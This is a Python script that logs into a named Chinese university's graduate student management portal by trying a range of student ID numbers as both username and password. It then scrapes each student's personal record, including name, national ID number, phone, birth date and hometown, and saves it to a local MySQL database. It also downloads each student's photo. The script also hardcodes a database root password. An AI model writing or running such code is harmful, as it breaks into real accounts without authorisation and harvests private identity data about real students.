#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

import requests
import json
import pymysql
import random
import time

# 头部信息
headers = {
    'Accept': '* / *',
    'Accept - Encoding': 'gzip, deflate',
    'Accept - Language': 'zh - CN, zh;q = 0.9',
    'Connection': 'keep - alive',
    'Content - Length': '71',
    'Content - Type': 'application / x - www - form - urlencoded;charset = UTF - 8',
    'Host': 'yjsgl.kmust.edu.cn',
    'Origin': 'http: // yjsgl.kmust.edu.cn',
    'Referer': 'http: // yjsgl.kmust.edu.cn / YJSYZHGLPT /',
    'User - Agent': 'Mozilla / 5.0(Macintosh; Intel Mac OS X 10_13_3) AppleWebKit / '
                    '537.36(KHTML, like Gecko) Chrome / 68.0.3440.106Safari / 537.36',
    'X - Requested - With': 'XMLHttpRequest',
}

l = []

info = {}


def get_details():
    for num in range(20162204001, 20162204300):
        t = random.uniform(0, 0.5)

        data = {
            'loginmodel.yhlxdm': '1',
            'loginmodel.gh': num,
            'loginmodel.mm': num,
        }
        r_session = requests.Session()
        r_session.post(url='http://yjsgl.kmust.edu.cn/YJSYZHGLPT/index/userLogin.action', data=data)

        con = r_session.post(url='http://yjsgl.kmust.edu.cn/YJSYZHGLPT/system/pygl/xjgl/xsxxgl/viewXsxx.action',
                             headers=headers, data={'xh': '1'})
        details = json.loads(con.text)

        try:
            details['data']['nj'] != '2017'
            insert_db(details['data'])

        except:
            l.append(num)
            continue
        pic = r_session.get(url='http://yjsgl.kmust.edu.cn/YJSYZHGLPT/common/getXszp.action?xh=1&mode=',
                            headers=headers)
        with open(f'/Users/dingweiqi/Desktop/kmust/yjs_2016/{str(num)}.png', 'wb') as f:
            f.write(pic.content)

        # time.sleep(t)


def insert_db(details):
    conn = pymysql.connect(
        host='localhost',
        user='root',
        password='Dd19950213',
        port=3306,
        database='kmust'
    )
    try:
        cursor = conn.cursor()
        exe = '''
                                                insert into bs (name_, num, id, school, major, type_, gender, birth, nation,
                                                phone, from_, college)
                                                value (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                                                '''
        cursor.execute(exe, (details['xm'], details['xh'], details['zjhm'], details['xymc'], details['zymc'],
                             details['pylbmc'], details['xbmc'], details['csrq'], details['mzmc'], details['lxdh'],
                             details['hkszdmc'], details['bkbydwmc']))

        conn.commit()
        print('done')

    except:
        return


if __name__ == "__main__":
    details = get_details()

    insert_db(details)
